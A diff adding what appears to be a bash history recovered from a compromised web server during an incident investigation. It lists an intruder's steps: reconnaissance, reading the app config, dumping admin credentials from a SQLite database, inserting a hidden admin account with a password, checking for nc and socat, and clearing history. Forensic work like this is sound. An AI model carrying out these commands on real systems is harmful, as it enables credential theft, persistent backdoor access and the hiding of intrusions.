@@ -1,0 +1,17 @@
+# recovered from /var/www/.bash_history on 192.168.8.198
+# file mtime: 2026-07-29 10:18:41 UTC
+id
+whoami
+uname -a
+pwd
+ls -la /var/www/app
+cat /var/www/app/config.py
+sudo -l
+ls -la /var/www/app/data
+sqlite3 /var/www/app/data/store.db ".tables"
+sqlite3 /var/www/app/data/store.db "select username,password,is_admin from users where is_admin=1;"
+sqlite3 /var/www/app/data/store.db "insert into users (username,password,fullname,email,address,is_admin) values ('svc_backup','Bk!2026-svc','Backup Service','svc@majal.store','-',1);"
+ls /var/www/app/receipts | wc -l
+cat /etc/crontab
+which nc socat python3
+history -c
